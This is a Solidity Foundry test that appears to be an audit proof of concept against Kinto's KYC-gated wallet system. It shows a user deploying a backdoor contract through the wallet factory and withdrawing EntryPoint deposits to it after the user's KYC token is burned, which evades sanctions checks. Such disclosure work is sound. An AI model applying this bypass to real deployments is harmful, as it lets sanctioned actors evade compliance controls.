// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import '../src/wallet/KintoWallet.sol';
import '../src/wallet/KintoWalletFactory.sol';
import '../src/paymasters/SponsorPaymaster.sol';
import '../src/KintoID.sol';
import {UserOp} from './helpers/UserOp.sol';
import {UUPSProxy} from './helpers/UUPSProxy.sol';
import {KYCSignature} from './helpers/KYCSignature.sol';

import '@aa/interfaces/IAccount.sol';
import '@aa/interfaces/INonceManager.sol';
import '@aa/interfaces/IEntryPoint.sol';
import '@aa/core/EntryPoint.sol';
import '@openzeppelin/contracts-upgradeable/utils/cryptography/ECDSAUpgradeable.sol';
import { UpgradeableBeacon } from '@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol';
import {SignatureChecker} from '@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol';
import "@openzeppelin/contracts/access/Ownable.sol";
import '@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol';
import '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';

import 'forge-std/Test.sol';
import 'forge-std/console.sol';

contract MyOpCreator is UserOp, KYCSignature {
    function _createOp(
      uint _chainID,
      address _account,
      uint nonce,
      uint256[] calldata _privateKeyOwners,
      address _targetContract,
      uint value,
      bytes calldata _bytesOp,
      address _paymaster
    ) public view returns (UserOperation memory op) {
      op = UserOperation({
        sender: _account,
        nonce: nonce,
        initCode: bytes(''),
        callData: abi.encodeCall(KintoWallet.execute, (_targetContract, value, _bytesOp)),
        callGasLimit: 40000, // generate from call simulation
        verificationGasLimit: 150000, // verification gas. will add create2 cost (3200+200*length) if initCode exists
        preVerificationGas: 99e18, // should also cover calldata cost.
        maxFeePerGas: 1, // grab from current gas
        maxPriorityFeePerGas: 1e9, // grab from current gas
        paymasterAndData: abi.encodePacked(_paymaster),
        signature: bytes('')
      });
      op.signature = _signUserOp(op, KintoWallet(payable(_account)).entryPoint(), _chainID, _privateKeyOwners);
      return op;
    }
}

contract MaliciousContract {
    function _doSomethingBad() internal view {
        console.log('%%%% STAGE 3 - execution %%%%');
        console.log('Now the EOA can use the pre-deployed account to execute calls -');
        console.log('even without a wallet or under sanctions!');
        console.log('Further note that - '); 
        console.log('A) the attacker can easily send smuggle in command data in the form of msg.value:');
        console.logUint(msg.value);
        console.log('B) we can have plenty of gas left to do whatever we want:');
        console.logUint(gasleft());
        console.log('...since Solidity call (as opposed to send/transfer) forwards all the remaining gas.');
    }
    receive() external payable {
        _doSomethingBad();
    }
}


contract EntryPointExploitTest is MyOpCreator {
    using ECDSAUpgradeable for bytes32;
    using SignatureChecker for address;

    EntryPoint _entryPoint;
    KintoWalletFactory _walletFactoryI;
    KintoWalletFactory _walletFactory;
    KintoID _implementation;
    KintoID _kintoIDv1;
    SponsorPaymaster _paymaster;

    KintoWallet _kintoWalletImpl;
    IKintoWallet _kintoWalletv1;
    UUPSProxy _proxy;
    UUPSProxy _proxyf;
    UUPSProxy _proxys;
    UpgradeableBeacon _beacon;
    MaliciousContract _maliciousContract;

    uint256 _chainID = 1;
    address payable _owner = payable(vm.addr(1));
    address _upgrader = address(2);
    address _kycProvider = address(3);
    address payable _user = payable(vm.addr(4));
    address _owner_recoverer = address(7);
    address _user_recoverer = address(7);

    function setUp() public {
        vm.chainId(_chainID);
        vm.startPrank(address(1));
        _owner.transfer(1e18);
        _user.transfer(1e18);
        vm.stopPrank();

        vm.startPrank(_owner);
        // Deploy Kinto ID
        _implementation = new KintoID();
        // deploy _proxy contract and point it to _implementation
        _proxy = new UUPSProxy{salt: 0}(address(_implementation), '');
        // wrap in ABI to support easier calls
        _kintoIDv1 = KintoID(address(_proxy));
        // Initialize _proxy
        _kintoIDv1.initialize();
        _kintoIDv1.grantRole(_kintoIDv1.DEFAULT_ADMIN_ROLE(), _owner);
        _kintoIDv1.grantRole(_kintoIDv1.KYC_PROVIDER_ROLE(), _kycProvider);
        _kintoIDv1.grantRole(_kintoIDv1.UPGRADER_ROLE(), _upgrader);
        _entryPoint = new EntryPoint{salt: 0}();
        // Deploy wallet implementation
        _kintoWalletImpl = new KintoWallet{salt: 0}(_entryPoint, _kintoIDv1);
        //Deploy wallet factory implementation
        _walletFactoryI = new KintoWalletFactory{salt: 0}(_kintoWalletImpl);
        _proxyf = new UUPSProxy{salt: 0}(address(_walletFactoryI), '');
        _walletFactory = KintoWalletFactory(address(_proxyf));
        // Initialize wallet factory
        _walletFactory.initialize(_kintoIDv1);
        // Set the wallet factory in the entry point
        _entryPoint.setWalletFactory(address(_walletFactory));
        // Mint an nft to the owner
        IKintoID.SignatureData memory sigdata_owner = _auxCreateSignature(
            _kintoIDv1, _owner, _owner, 1, block.timestamp + 1000);
        uint8[] memory traits_owner = new uint8[](0);
        vm.startPrank(_kycProvider);
        _kintoIDv1.mintIndividualKyc(sigdata_owner, traits_owner);
        vm.stopPrank();
        vm.startPrank(_owner);
        // deploy walletv1 through wallet factory and initializes it
        _kintoWalletv1 = _walletFactory.createAccount(_owner, _owner_recoverer, 0);
        // deploy the paymaster
        _paymaster = new SponsorPaymaster{salt: 0}(_entryPoint);
        // deploy _proxy contract and point it to _implementation
        _proxys = new UUPSProxy(address(_paymaster), '');
        // wrap in ABI to support easier calls
        _paymaster = SponsorPaymaster(address(_proxys));
        // Initialize proxy
        _paymaster.initialize(_owner);
        vm.stopPrank();
        console.log('%%%% STAGE 0 - system initialization %%%%');

        // console.log('%%%% STAGE 1 - initialization %%%%');
        // console.log('Kinto wallet address ', address(_kintoWalletv1));
        // console.log('wallet owner address ', _owner);
        // console.log('is the wallet owner saction safe?');
        // bool isWalletSafe = _kintoIDv1.isKYC(address(_owner));
        // console.logBool(isWalletSafe);
        // console.log('%%%% STAGE 2 - deploy backdoor contract %%%%');
    }

    function testExploit() public {
        attackerCreatesMaliciousContract();
    }

    function attackerCreatesMaliciousContract() public
    {
        vm.startPrank(_kycProvider);
        // Mint an nft to the user
        IKintoID.SignatureData memory sigdata_user = _auxCreateSignature(
            _kintoIDv1, _user, _user, 4, block.timestamp + 1000);
        uint8[] memory traits_user = new uint8[](0);
        vm.startPrank(_kycProvider);
        _kintoIDv1.mintIndividualKyc(sigdata_user, traits_user);
        vm.stopPrank();
        vm.deal(_user,1000e8); 
        // console.log('%%%% STAGE 1 - initialization %%%%');
        // console.log('Attacker address: %s',  address(_user));
        // console.log('At this point, is the attacker address:');
        // console.logAddress(address(_user));
        // console.log('saction safe?');
        // bool isUserSactionSafe = _kintoIDv1.isKYC(address(_user));
        // console.logBool(isUserSactionSafe);
        console.log('Exploit Stages');
        console.log('%%%% STAGE 1 - preperation %%%%');
        vm.startPrank(_user);
        console.log('Balance before: %d', _entryPoint.balanceOf(_user));
        _entryPoint.depositTo{value:10e8}(_user); // alternatively, payable(address(_entryPoint)).call{value:10e8}("");
        console.log('Balance after: %d', _entryPoint.balanceOf(_user));
        console.log('1.1) Attacker prepares a deposit of 10 Ether into the Entry Point');
        address payable created = payable(_walletFactory.deployContract(0,abi.encodePacked(type(MaliciousContract).creationCode), bytes32(0)));
        _maliciousContract = MaliciousContract(created);
        vm.stopPrank();
        console.log('1.2) Attacker creates backdoor contract at address');
        console.logAddress(address(_maliciousContract));

        // console.log('Sanity check: is the attacker address');
        // console.logAddress(address(_user));
        // console.log('saction safe?');
        // bool isUserSactionSafe = _kintoIDv1.isKYC(address(_user));
        // console.logBool(isUserSactionSafe);

        vm.startPrank(_kycProvider);
        sigdata_user = _auxCreateSignature(_kintoIDv1, _user, _user, 4, block.timestamp + 1000);
        _kintoIDv1.burnKYC(sigdata_user);
        vm.stopPrank();
        console.log('*** At this point, the attacker is caught by the KYC Provider and his token gets burned ***');
        console.log('However...');

        // console.log('Sanity check: is the attacker address saction safe now?');
        // isUserSactionSafe = _kintoIDv1.isKYC(address(_user));
        // console.logBool(isUserSactionSafe);

        console.log('%%%% STAGE 2 - using the backdoor %%%%');
        uint256 amount_to_send=7692;
        vm.startPrank(_user);
        _entryPoint.withdrawTo(payable(address(_maliciousContract)),amount_to_send);
        vm.stopPrank();

    }

}
